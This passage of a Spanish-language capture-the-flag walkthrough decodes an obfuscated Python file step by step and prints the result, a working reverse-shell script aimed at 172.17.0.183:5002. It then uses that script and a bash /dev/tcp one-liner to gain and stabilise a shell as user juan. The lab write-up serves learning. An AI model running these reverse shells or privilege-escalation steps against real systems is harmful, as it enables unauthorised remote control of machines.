chr(50), chr(87), chr(78), chr(78), chr(69), chr(85), chr(73), chr(77), chr(68), chr(72), chr(77), chr(81), chr(90), chr(69), chr(77), chr(52), chr(68), chr(69), chr(73), chr(89), chr(52), chr(87), chr(50), chr(89), chr(82), chr(84), chr(74), chr(74), chr(84), chr(70), chr(83), chr(77), chr(82), chr(90), chr(79), chr(82), chr(82), chr(70), chr(79), chr(82), chr(84), chr(86), chr(76), chr(74), chr(66), chr(87), chr(81), chr(54), chr(83), chr(76), chr(75), chr(70), chr(88), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(52), chr(70), chr(69), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(84), chr(50), chr(74), chr(82), chr(87), chr(85), chr(52), chr(52), chr(51), chr(67), chr(71), chr(78), chr(72), chr(71), chr(89), chr(83), chr(50), chr(68), chr(78), chr(78), chr(70), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(69), chr(51), chr(68), chr(70), chr(73), chr(53), chr(72), chr(71), chr(89), chr(89), chr(50), chr(73), chr(75), chr(70), chr(84), chr(87), chr(71), chr(77), chr(82), chr(90), chr(78), chr(74), chr(81), chr(84), chr(69), chr(86), chr(82), chr(81), chr(74), chr(82), chr(87), chr(86), chr(77), chr(54), chr(76), chr(68), chr(78), chr(85), chr(52), chr(88), chr(83), chr(84), chr(51), chr(72), chr(78), chr(53), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(66), chr(72), chr(79), chr(67), chr(83), chr(90), chr(76), chr(66), chr(72), chr(72), chr(85), chr(81), chr(51), chr(74), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(77), chr(82), chr(68), chr(87), chr(89), chr(53), chr(67), chr(50), chr(75), chr(77), chr(50), chr(88), chr(85), chr(89), chr(83), chr(72), chr(75), chr(90), chr(87), chr(71), chr(71), chr(81), chr(51), chr(72), chr(71), chr(70), chr(70), chr(86), chr(67), chr(51), chr(50), chr(76), chr(77), chr(70), chr(76), chr(86), chr(83), chr(90), chr(50), chr(89), chr(71), chr(69), chr(52), chr(88), chr(75), chr(87), chr(75), chr(88), chr(71), chr(70), chr(87), chr(70), chr(81), chr(77), chr(74), chr(89), chr(77), chr(53), chr(73), chr(70), chr(73), chr(77), chr(68), chr(72), chr(74), chr(70), chr(87), chr(68), chr(83), chr(90), chr(84), chr(67), chr(75), chr(53), chr(68), chr(72), chr(65), chr(89), chr(84), chr(77), chr(72), chr(70), chr(84), chr(69), chr(83), chr(50), chr(84), chr(80), chr(74), chr(78), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(66), chr(74), chr(69), chr(85), chr(81), chr(84), chr(82), chr(86), chr(77), chr(78), chr(52), chr(84), chr(75), chr(51), chr(68), chr(70), chr(73), chr(53), chr(87), chr(68), chr(65), chr(83), chr(50), chr(72), chr(71), chr(70), chr(85), chr(71), chr(67), chr(86), chr(90), chr(85), chr(78), chr(53), chr(70), chr(86), chr(71), chr(50), chr(50), chr(76), chr(66), chr(73), chr(61), chr(61), chr(61), chr(61), chr(61), chr(61), chr(39), chr(41), chr(41), chr(41)]))
```

lo triago a mi maquina y vamos a intentar desofuscarlo,

utilizo este script, algo rudimentario pero estaba con prisa:
```bash
import re

def desofuscar_codigo(archivo_entrada, archivo_salida):
    # Abrir el archivo ofuscado
    with open(archivo_entrada, 'r') as file:
        contenido = file.read()

    # Buscar todas las llamadas a chr() con números entre paréntesis
    patrones_chr = re.findall(r'chr\((\d+)\)', contenido)
    
    # Convertir los números encontrados a sus correspondientes caracteres ASCII
    caracteres = ''.join([chr(int(num)) for num in patrones_chr])

    # Reemplazar las llamadas a chr() por los caracteres correspondientes
    codigo_desofuscado = contenido
    for i, num in enumerate(patrones_chr):
        codigo_desofuscado = codigo_desofuscado.replace(f'chr({num})', caracteres[i])

    # Guardar el código desofuscado en el archivo de salida
    with open(archivo_salida, 'w') as file:
        file.write(codigo_desofuscado)

    print(f"El código desofuscado ha sido guardado en {archivo_salida}")

# Uso del script
archivo_entrada = 'ofuscado-py'  # Archivo ofuscado
archivo_salida = 'desofuscado-py'  # Archivo donde se guardará el código desofuscado
desofuscar_codigo(archivo_entrada, archivo_salida)
```
 y me da como resultado:
 ```
exec("".join([i, m, p, o, r, t,  , b, a, s, e, 6, 4, ;,  , e, x, e, c, (, b, a, s, e, 6, 4, ., b, 6, 4, d, e, c, o, d, e, (, b, a, s, e, 6, 4, ., b, 3, 2, d, e, c, o, d, e, (, ', M, F, L, T, C, 5, 3, C, G, N, F, D, A, S, K, I, J, Y, 2, W, G, 5, 3, Q, O, B, R, F, Q, Q, T, W, M, N, X, F, C, Z, 3, C, G, N, G, U, W, Y, K, X, G, F, 3, W, E, M, 2, K, G, B, E, U, Q, T, R, R, L, F, X, E, E, 6, L, C, G, J, H, G, Y, Y, Z, T, J, V, F, W, C, V, Z, R, O, 5, R, D, G, S, R, Q, J, F, E, E, 4, 5, S, Z, G, J, 2, G, Y, Z, C, B, O, B, Y, G, E, W, C, C, O, Y, F, G, G, 3, S, R, M, 5, S, E, O, 3, D, U, L, J, I, W, 6, S, 2, T, I, U, 4, V, I, V, S, D, I, E, 4, U, S, Q, 2, J, P, B, H, H, U, S, L, V, J, V, K, G, G, 5, K, N, I, M, 2, H, Q, T, 2, E, J, V, U, U, G, 3, C, C, K, B, K, W, Y, U, L, H, K, B, J, U, C, M, K, N, I, R, A, X, S, Q, 3, H, O, B, V, V, U, V, 2, Z, M, 5, M, T, E, O, L, V, M, J, W, V, M, 2, T, E, I, N, U, G, 6, C, T, C, G, N, H, D, A, T, C, D, I, J, 3, W, E, M, 2, K, G, B, F, V, I, 3, 2, L, J, F, B, U, C, Z, 2, J, J, B, G, W, O, U, C, T, I, J, 5, G, E, M, S, O, O, J, N, F, Q, U, L, V, M, M, Z, D, S, 2, T, B, G, J, L, D, A, S, 2, I, J, Z, 3, F, S, M, T, U, N, R, S, E, G, N, K, C, K, J, W, D, S, S, S, U, N, N, L, F, K, T, C, D, I, J, 5, G, E, M, S, O, O, J, N, F, Q, U, L, V, B, J, K, T, A, O, K, E, K, M, Y, T, S, V, C, W, I, Z, F, E, M, U, K, V, G, B, Y, E, G, 2, K, B, M, 5, E, U, G, Q, T, 2, J, R, W, U, 4, 5, T, C, N, U, 2, W, Y, W, J, T, K, F, X, U, W, R, 3, I, O, Z, R, T, G, U, L, T, J, F, E, E, E, 5, T, D, N, Z, I, X, A, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 5, R, W, 2, V, R, Q, M, R, M, E, U, 5, K, J, J, B, G, U, W, Q, 3, N, K, J, W, A, U, W, T, J, I, I, Z, V, S, V, 3, M, G, B, M, D, E, W, T, W, M, N, W, D, S, 2, T, C, G, I, Y, X, I, W, K, X, G, V, V, U, W, S, C, N, O, B, H, W, O, 3, 3, H, J, F, B, U, C, Z, 2, 2, I, 5, D, D, A, W, K, T, I, E, 4, U, S, S, C, N, O, V, R, W, 2, V, T, K, M, R, U, W, O, 6, C, N, I, R, E, T, A, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 5, Q, V, O, W, L, H, L, J, D, U, M, M, A, K, L, F, J, U, C, O, K, Q, K, N, A, W, S, Y, 2, Y, K, Z, Y, G, I, R, T, Y, O, V, E, W, U, 3, 2, L, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, J, 5, E, Y, 3, K, O, O, N, R, D, G, T, T, M, J, N, B, W, W, S, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, C, P, J, S, V, Q, T, L, V, L, J, M, G, Q, 4, D, E, I, N, T, X, O, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 4, F, E, S, 6, K, C, G, B, Q, U, O, V, L, H, M, M, Z, D, S, 2, T, B, G, J, L, D, A, S, K, H, K, J, Y, F, U, V, 2, R, J, N, E, U, G, Q, L, H, J, F, D, V, M, 4, 3, B, K, 5, M, W, O, Y, S, H, K, Z, 2, U, W, R, 2, S, N, B, S, E, O, R, L, Q, J, F, C, D, A, O, K, J, I, R, A, T, M, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, M, N, W, V, M, M, D, E, L, B, F, H, K, C, S, J, I, Z, J, H, S, Z, C, X, K, V, F, U, S, Q, 2, B, M, 5, E, U, O, V, T, T, M, M, Z, F, K, N, S, D, M, 5, X, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, Q, Q, T, Z, M, I, Z, E, 2, Z, 2, Q, K, N, B, H, U, Z, C, X, J, J, 3, W, G, 3, J, Z, N, J, N, F, Q, T, T, 2, J, R, W, E, E, 5, T, D, I, 5, L, H, K, S, 2, H, K, J, U, G, I, R, 2, F, O, N, E, U, Q, T, T, P, B, J, N, F, O, 6, D, T, K, B, L, F, E, 6, L, E, K, 5, K, X, G, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, M, 2, S, N, N, R, D, G, V, R, Q, K, B, M, E, 4, M, K, Z, N, Z, B, H, S, Y, R, S, J, Z, W, A, U, Y, Z, T, J, V, 2, V, K, R, L, M, K, F, J, F, G, 5, 3, H, M, M, Z, V, E, 2, 2, 2, L, B, F, H, S, U, C, Y, J, Y, Y, V, S, 3, S, C, P, F, R, D, E, T, T, M, M, M, Z, U, 2, 5, K, V, I, V, W, F, C, U, S, T, O, 5, F, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, Y, K, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, J, 5, G, I, R, 2, S, O, B, R, G, U, M, L, 2, M, R, L, U, U, 5, 3, D, N, U, 4, W, U, W, S, Y, J, Z, 5, E, Y, 3, C, C, J, J, K, U, K, V, L, Q, I, N, U, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, M, 2, S, N, N, R, D, G, V, R, Q, L, A, Z, V, U, 2, D, C, J, B, L, G, Y, S, K, E, G, B, T, W, G, S, C, K, O, Y, F, F, S, 6, J, V, P, J, S, E, O, U, T, W, M, R, M, F, C, 5, L, D, N, V, L, G, Q, W, S, D, M, 5, Y, E, S, Q, 3, T, M, 5, R, U, Q, S, T, W, L, F, 4, T, K, 6, T, E, I, 5, J, G, Y, Y, 3, O, J, F, 2, W, G, 3, K, W, N, B, N, E, G, Z, 3, Q, I, N, U, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, 6, J, V, P, J, N, F, O, N, L, L, J, N, E, E, 4, M, C, 2, I, 4, 4, T, C, C, T, E, I, Y, 4, T, E, W, K, X, P, A, Y, V, U, U, 3, L, J, N, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, H, S, W, S, Y, K, I, Y, W, G, 3, J, U, M, 5, J, G, 2, R, T, T, M, M, Z, F, K, S, 2, D, N, V, J, G, Y, W, T, J, I, J, 2, F, S, V, 3, M, O, V, F, U, G, 2, Z, W, I, N, U, U, C, Z, 2, J, I, N, B, D, G, Y, K, H, N, R, Z, V, U, U, 2, C, K, V, R, W, 4, V, T, M, B, J, H, W, O, 3, 3, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, I, J, Z, 3, F, S, M, T, U, N, R, S, E, M, O, L, L, M, F, L, V, M, 2, 2, J, I, Q, Y, G, O, U, T, N, I, Z, Z, W, G, M, S, V, J, N, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, D, A, Y, 3, O, N, M, 3, E, G, 2, K, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, I, J, V, T, Q, U, U, C, T, I, J, V, G, E, M, R, V, O, V, N, F, O, T, R, Q, J, N, C, W, Q, U, C, V, G, F, I, X, G, S, K, G, I, J, I, F, K, 3, C, R, O, B, B, W, S, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, S, D, E, N, 5, Q, V, O, 6, D, M, J, F, D, T, K, 5, T, E, I, N, B, H, U, Y, R, S, J, Z, Z, F, U, W, C, S, M, Z, N, E, O, 3, D, M, L, J, C, G, 6, S, Y, K, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, E, E, 4, 5, S, Z, G, J, 2, G, Y, Z, C, G, H, F, V, W, C, V, 2, W, N, N, E, U, I, M, D, H, M, Q, Z, E, M, 4, D, E, I, Y, 4, W, 2, Y, R, T, J, J, T, F, S, M, R, Z, O, R, R, F, O, R, T, V, L, J, B, W, Q, 6, S, L, K, F, X, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 4, F, E, S, Q, 2, B, M, 5, E, U, G, Q, T, 2, J, R, W, U, 4, 4, 3, C, G, N, H, G, Y, S, 2, D, N, N, F, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, E, 3, D, F, I, 5, H, G, Y, Y, 2, I, K, F, T, W, G, M, R, Z, N, J, Q, T, E, V, R, Q, J, R, W, V, M, 6, L, D, N, U, 4, X, S, T, 3, H, N, 5, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, H, O, C, S, Z, L, B, H, H, U, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, M, R, D, W, Y, 5, C, 2, K, M, 2, X, U, Y, S, H, K, Z, W, G, G, Q, 3, H, G, F, F, V, C, 3, 2, L, M, F, L, V, S, Z, 2, Y, G, E, 4, X, K, W, K, X, G, F, W, F, Q, M, J, Y, M, 5, I, F, I, M, D, H, J, F, W, D, S, Z, T, C, K, 5, D, H, A, Y, T, M, H, F, T, E, S, 2, T, P, J, N, E, U, G, Q, L, H, B, J, E, U, Q, T, R, V, M, N, 4, T, K, 3, D, F, I, 5, W, D, A, S, 2, H, G, F, U, G, C, V, Z, U, N, 5, F, V, G, 2, 2, L, B, I, =, =, =, =, =, =, ', ), ), )]))
```
ya sabeis quitar comas y os queda un código muy bonito, la otra opcion es quedarte con la cadena original y con sed y regex te quedas solo con el codigo en ASCII y online lo puedes desencriptar

me cojo toda esta parte del codigo:
```
 M, F, L, T, C, 5, 3, C, G, N, F, D, A, S, K, I, J, Y, 2, W, G, 5, 3, Q, O, B, R, F, Q, Q, T, W, M, N, X, F, C, Z, 3, C, G, N, G, U, W, Y, K, X, G, F, 3, W, E, M, 2, K, G, B, E, U, Q, T, R, R, L, F, X, E, E, 6, L, C, G, J, H, G, Y, Y, Z, T, J, V, F, W, C, V, Z, R, O, 5, R, D, G, S, R, Q, J, F, E, E, 4, 5, S, Z, G, J, 2, G, Y, Z, C, B, O, B, Y, G, E, W, C, C, O, Y, F, G, G, 3, S, R, M, 5, S, E, O, 3, D, U, L, J, I, W, 6, S, 2, T, I, U, 4, V, I, V, S, D, I, E, 4, U, S, Q, 2, J, P, B, H, H, U, S, L, V, J, V, K, G, G, 5, K, N, I, M, 2, H, Q, T, 2, E, J, V, U, U, G, 3, C, C, K, B, K, W, Y, U, L, H, K, B, J, U, C, M, K, N, I, R, A, X, S, Q, 3, H, O, B, V, V, U, V, 2, Z, M, 5, M, T, E, O, L, V, M, J, W, V, M, 2, T, E, I, N, U, G, 6, C, T, C, G, N, H, D, A, T, C, D, I, J, 3, W, E, M, 2, K, G, B, F, V, I, 3, 2, L, J, F, B, U, C, Z, 2, J, J, B, G, W, O, U, C, T, I, J, 5, G, E, M, S, O, O, J, N, F, Q, U, L, V, M, M, Z, D, S, 2, T, B, G, J, L, D, A, S, 2, I, J, Z, 3, F, S, M, T, U, N, R, S, E, G, N, K, C, K, J, W, D, S, S, S, U, N, N, L, F, K, T, C, D, I, J, 5, G, E, M, S, O, O, J, N, F, Q, U, L, V, B, J, K, T, A, O, K, E, K, M, Y, T, S, V, C, W, I, Z, F, E, M, U, K, V, G, B, Y, E, G, 2, K, B, M, 5, E, U, G, Q, T, 2, J, R, W, U, 4, 5, T, C, N, U, 2, W, Y, W, J, T, K, F, X, U, W, R, 3, I, O, Z, R, T, G, U, L, T, J, F, E, E, E, 5, T, D, N, Z, I, X, A, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 5, R, W, 2, V, R, Q, M, R, M, E, U, 5, K, J, J, B, G, U, W, Q, 3, N, K, J, W, A, U, W, T, J, I, I, Z, V, S, V, 3, M, G, B, M, D, E, W, T, W, M, N, W, D, S, 2, T, C, G, I, Y, X, I, W, K, X, G, V, V, U, W, S, C, N, O, B, H, W, O, 3, 3, H, J, F, B, U, C, Z, 2, 2, I, 5, D, D, A, W, K, T, I, E, 4, U, S, S, C, N, O, V, R, W, 2, V, T, K, M, R, U, W, O, 6, C, N, I, R, E, T, A, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 5, Q, V, O, W, L, H, L, J, D, U, M, M, A, K, L, F, J, U, C, O, K, Q, K, N, A, W, S, Y, 2, Y, K, Z, Y, G, I, R, T, Y, O, V, E, W, U, 3, 2, L, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, J, 5, E, Y, 3, K, O, O, N, R, D, G, T, T, M, J, N, B, W, W, S, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, C, P, J, S, V, Q, T, L, V, L, J, M, G, Q, 4, D, E, I, N, T, X, O, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 4, F, E, S, 6, K, C, G, B, Q, U, O, V, L, H, M, M, Z, D, S, 2, T, B, G, J, L, D, A, S, K, H, K, J, Y, F, U, V, 2, R, J, N, E, U, G, Q, L, H, J, F, D, V, M, 4, 3, B, K, 5, M, W, O, Y, S, H, K, Z, 2, U, W, R, 2, S, N, B, S, E, O, R, L, Q, J, F, C, D, A, O, K, J, I, R, A, T, M, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, M, N, W, V, M, M, D, E, L, B, F, H, K, C, S, J, I, Z, J, H, S, Z, C, X, K, V, F, U, S, Q, 2, B, M, 5, E, U, O, V, T, T, M, M, Z, F, K, N, S, D, M, 5, X, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, Q, Q, T, Z, M, I, Z, E, 2, Z, 2, Q, K, N, B, H, U, Z, C, X, J, J, 3, W, G, 3, J, Z, N, J, N, F, Q, T, T, 2, J, R, W, E, E, 5, T, D, I, 5, L, H, K, S, 2, H, K, J, U, G, I, R, 2, F, O, N, E, U, Q, T, T, P, B, J, N, F, O, 6, D, T, K, B, L, F, E, 6, L, E, K, 5, K, X, G, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, M, 2, S, N, N, R, D, G, V, R, Q, K, B, M, E, 4, M, K, Z, N, Z, B, H, S, Y, R, S, J, Z, W, A, U, Y, Z, T, J, V, 2, V, K, R, L, M, K, F, J, F, G, 5, 3, H, M, M, Z, V, E, 2, 2, 2, L, B, F, H, S, U, C, Y, J, Y, Y, V, S, 3, S, C, P, F, R, D, E, T, T, M, M, M, Z, U, 2, 5, K, V, I, V, W, F, C, U, S, T, O, 5, F, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, Y, K, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, J, 5, G, I, R, 2, S, O, B, R, G, U, M, L, 2, M, R, L, U, U, 5, 3, D, N, U, 4, W, U, W, S, Y, J, Z, 5, E, Y, 3, C, C, J, J, K, U, K, V, L, Q, I, N, U, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, M, 2, S, N, N, R, D, G, V, R, Q, L, A, Z, V, U, 2, D, C, J, B, L, G, Y, S, K, E, G, B, T, W, G, S, C, K, O, Y, F, F, S, 6, J, V, P, J, S, E, O, U, T, W, M, R, M, F, C, 5, L, D, N, V, L, G, Q, W, S, D, M, 5, Y, E, S, Q, 3, T, M, 5, R, U, Q, S, T, W, L, F, 4, T, K, 6, T, E, I, 5, J, G, Y, Y, 3, O, J, F, 2, W, G, 3, K, W, N, B, N, E, G, Z, 3, Q, I, N, U, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, 6, J, V, P, J, N, F, O, N, L, L, J, N, E, E, 4, M, C, 2, I, 4, 4, T, C, C, T, E, I, Y, 4, T, E, W, K, X, P, A, Y, V, U, U, 3, L, J, N, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, H, S, W, S, Y, K, I, Y, W, G, 3, J, U, M, 5, J, G, 2, R, T, T, M, M, Z, F, K, S, 2, D, N, V, J, G, Y, W, T, J, I, J, 2, F, S, V, 3, M, O, V, F, U, G, 2, Z, W, I, N, U, U, C, Z, 2, J, I, N, B, D, G, Y, K, H, N, R, Z, V, U, U, 2, C, K, V, R, W, 4, V, T, M, B, J, H, W, O, 3, 3, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, I, J, Z, 3, F, S, M, T, U, N, R, S, E, M, O, L, L, M, F, L, V, M, 2, 2, J, I, Q, Y, G, O, U, T, N, I, Z, Z, W, G, M, S, V, J, N, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, D, A, Y, 3, O, N, M, 3, E, G, 2, K, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, I, J, V, T, Q, U, U, C, T, I, J, V, G, E, M, R, V, O, V, N, F, O, T, R, Q, J, N, C, W, Q, U, C, V, G, F, I, X, G, S, K, G, I, J, I, F, K, 3, C, R, O, B, B, W, S, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, S, D, E, N, 5, Q, V, O, 6, D, M, J, F, D, T, K, 5, T, E, I, N, B, H, U, Y, R, S, J, Z, Z, F, U, W, C, S, M, Z, N, E, O, 3, D, M, L, J, C, G, 6, S, Y, K, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, E, E, 4, 5, S, Z, G, J, 2, G, Y, Z, C, G, H, F, V, W, C, V, 2, W, N, N, E, U, I, M, D, H, M, Q, Z, E, M, 4, D, E, I, Y, 4, W, 2, Y, R, T, J, J, T, F, S, M, R, Z, O, R, R, F, O, R, T, V, L, J, B, W, Q, 6, S, L, K, F, X, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 4, F, E, S, Q, 2, B, M, 5, E, U, G, Q, T, 2, J, R, W, U, 4, 4, 3, C, G, N, H, G, Y, S, 2, D, N, N, F, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, E, 3, D, F, I, 5, H, G, Y, Y, 2, I, K, F, T, W, G, M, R, Z, N, J, Q, T, E, V, R, Q, J, R, W, V, M, 6, L, D, N, U, 4, X, S, T, 3, H, N, 5, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, H, O, C, S, Z, L, B, H, H, U, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, M, R, D, W, Y, 5, C, 2, K, M, 2, X, U, Y, S, H, K, Z, W, G, G, Q, 3, H, G, F, F, V, C, 3, 2, L, M, F, L, V, S, Z, 2, Y, G, E, 4, X, K, W, K, X, G, F, W, F, Q, M, J, Y, M, 5, I, F, I, M, D, H, J, F, W, D, S, Z, T, C, K, 5, D, H, A, Y, T, M, H, F, T, E, S, 2, T, P, J, N, E, U, G, Q, L, H, B, J, E, U, Q, T, R, V, M, N, 4, T, K, 3, D, F, I, 5, W, D, A, S, 2, H, G, F, U, G, C, V, Z, U, N, 5, F, V, G, 2, 2, L, B, I, =, =, =, =, =, =
```
la meto en un archivo llamado cadena.txt y con regex:
```bash
cat cadena.txt | tr -d ', ' > sin_comas_ni_espacios.txt 
```
tenemos un base 32 que guardo en un archivo denombre base32
```
aW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHNvY2tldAppbXBv
cnQgdGltZQoKSE9TVCA9ICIxNzIuMTcuMC4xODMiClBPUlQgPSA1MDAyCgpkZWYgY29ubmVjdCho
b3N0LCBwb3J0KToKICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQu
U09DS19TVFJFQU0pCiAgICBzLmNvbm5lY3QoKGhvc3QsIHBvcnQpKQogICAgcmV0dXJuIHMKCmRl
ZiB3YWl0X2Zvcl9jb21tYW5kKHMpOgogICAgZGF0YSA9IHMucmVjdigxMDI0KQogICAgaWYgZGF0
YSA9PSAicXVpdFxuIjoKICAgICAgICBzLmNsb3NlKCkKICAgICAgICBzeXMuZXhpdCgwKQogICAg
IyB0aGUgc29ja2V0IGRpZWQKICAgIGVsaWYgbGVuKGRhdGEpID09IDA6CiAgICAgICAgcmV0dXJu
IFRydWUKICAgIGVsc2U6CgogICAgICAgIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKGRhdGEsIHNo
ZWxsPVRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3Rkb3V0PXN1YnByb2Nl
c3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwKICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICBzdGRpbj1zdWJwcm9jZXNzLlBJUEUpCiAgICAgICAgc3Rkb3V0X3ZhbHVlID0gcHJv
Yy5zdGRvdXQucmVhZCgpICsgcHJvYy5zdGRlcnIucmVhZCgpCiAgICAgICAgcy5zZW5kKHN0ZG91
dF92YWx1ZSkKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBtYWluKCk6CiAgICB3aGlsZSBUcnVl
OgogICAgICAgIHNvY2tldF9kaWVkID0gRmFsc2UKICAgICAgICB0cnk6CiAgICAgICAgICAgIHMg
PSBjb25uZWN0KEhPU1QsIFBPUlQpCiAgICAgICAgICAgIHdoaWxlIG5vdCBzb2NrZXRfZGllZDoK
ICAgICAgICAgICAgICAgIHNvY2tldF9kaWVkID0gd2FpdF9mb3JfY29tbWFuZChzKQogICAgICAg
ICAgICBzLmNsb3NlKCkKICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgICAgICAgICBw
YXNzCiAgICAgICAgdGltZS5zbGVlcCg1KQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAg
IHN5cy5leGl0KG1haW4oKSkK
```
y con
```bash
cat base32 | base64 -d
```
podemos por fin leer el script sin ofuscar
```
import sys
import os
import subprocess
import socket
import time

HOST = "172.17.0.183"
PORT = 5002

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def wait_for_command(s):
    data = s.recv(1024)
    if data == "quit\n":
        s.close()
        sys.exit(0)
    # the socket died
    elif len(data) == 0:
        return True
    else:

        proc = subprocess.Popen(data, shell=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)
        return False

def main():
    while True:
        socket_died = False
        try:
            s = connect(HOST, PORT)
            while not socket_died:
                socket_died = wait_for_command(s)
            s.close()
        except socket.error:
            pass
        time.sleep(5)

if __name__ == "__main__":
    sys.exit(main())
```
este script entabla una reverse shell aquí:
```
HOST = "172.17.0.183"
PORT = 5002
```
de ahi que al inicio cambié la ip, si hubieramos seguido con la que nos asigna en este punto debemos cambiar nuestra ip :
```bash
sudo ip addres del 172.17.0.1/16 dev docker0 # elimina mi actual direccion ip
sudo ip addres add 172.17.0.183/16 dev docker0 # asigno la ip de la reverseshell
```
y levantar todo de nuevo, nos hemos ahorrado ese paso, a mi me dió bastante rabia cuando lo estaba haciendo a ciegas pero...

nos ponemos a la escucha por el puerto 5002
```bash
sudo nc -nvlp 5002
```
y ejecutamos el script
```bash
sudo -u juan /usr/bin/python3 /home/juan/shell.py
```
estamos dentro pero....horror al cabo de un tiempo cierra conexión, para saltarmelo lo que hago es ponerme en la escucha en el puerto 6666 y mandarme una rev ahi desde la interfaz del netcat del puerto 5002:
```
listening on [any] 5002 ...
connect to [172.17.0.183] from (UNKNOWN) [172.17.0.2] 42780
```
desde el listener del puerto 5002:
```bash
bash -c "bash -i >& /dev/tcp/172.17.0.183/6666 0>&1"
```
## fase escalada usuario juan

tratamiento de la tty
```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
